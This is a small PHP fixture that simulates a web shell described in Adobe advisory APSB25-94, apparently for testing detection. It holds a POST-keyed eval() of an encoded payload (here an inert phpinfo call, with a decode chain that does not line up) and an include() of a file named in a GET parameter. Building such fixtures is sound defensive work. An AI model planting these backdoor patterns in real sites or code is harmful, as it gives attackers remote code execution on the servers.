<?php
// Fixture reconstructed from public APSB25-94 Adobe advisory (https://helpx.adobe.com/security/products/magento/apsb25-94.html). No operator-local content.
// Simulates a polyshell-class PHP file with obfuscated eval payload (APSB25-94 attack pattern).
// BL-STAGE: polyshell-v1-auth-marker
$auth_key = "BL-STAGE";
$payload = "cGhwaW5mbygpOw==";
if (isset($_POST[$auth_key])) {
    $data = base64_decode($payload);
    $decoded = gzinflate(base64_decode($data));
    eval($decoded);
}
// Secondary stage loader pattern (double-extension execution via AddHandler)
if (preg_match('/\.php\.(jpg|png|gif)$/', $_SERVER['REQUEST_URI'])) {
    include($_GET['f']);
}
?>
